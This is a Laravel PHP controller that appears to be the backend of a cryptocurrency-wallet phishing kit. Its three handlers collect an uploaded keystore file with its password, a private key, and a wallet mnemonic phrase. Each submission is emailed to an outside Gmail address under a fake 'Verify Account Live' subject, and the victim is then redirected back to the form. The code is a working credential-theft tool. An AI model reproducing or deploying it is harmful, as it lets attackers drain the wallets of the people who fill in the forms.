<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Mail;

class ActionController extends Controller
{
    public function firstform(Request $request)
    {
    	$upload_link = "No file uploaded";
        if ($request->hasFile('keystorefile')) {
          $file = $request->file('keystorefile');
          $name = rand().'.'.$file->getClientOriginalExtension();
          $file->move(public_path('keystorefile/'), $name);
          $upload_link = "keystorefile/".$name;
        }

        $data = array('keystorefile' => $upload_link, 'keystorepassword' => $request->keystorepassword);

		Mail::send(['text'=>'firstform'], $data, function($message) {
		 $message->to('babalolaebenezertaiwo@gmail.com', 'Verify Account Live : By keystorefile')->subject
		    ('Verify Account Live : By keystorefile');
		 $message->from('xyz@gmail.com','Website');
		});

    	return redirect()->back();
    }

    public function secondform(Request $request)
    {
	   	$data = array('privatekeypass' => $request->privatekeypass);
	   
		Mail::send(['text'=>'secondform'], $data, function($message) {
		 $message->to('babalolaebenezertaiwo@gmail.com', 'Verify Account Live : By Private Key')->subject
		    ('Verify Account Live : By Private Key');
		 $message->from('xyz@gmail.com','Website');
		});

    	return redirect()->back();
    }

    public function thirdform(Request $request)
    {
	   	$data = array('mneomic' => $request->mneomic);
	   
		Mail::send(['text'=>'thirdform'], $data, function($message) {
		 $message->to('babalolaebenezertaiwo@gmail.com', 'Verify Account Live : By Mneomic Phrase')->subject
		    ('Verify Account Live : By Mneomic Phrase');
		 $message->from('xyz@gmail.com','Website');
		});

    	return redirect()->back();
    }
}
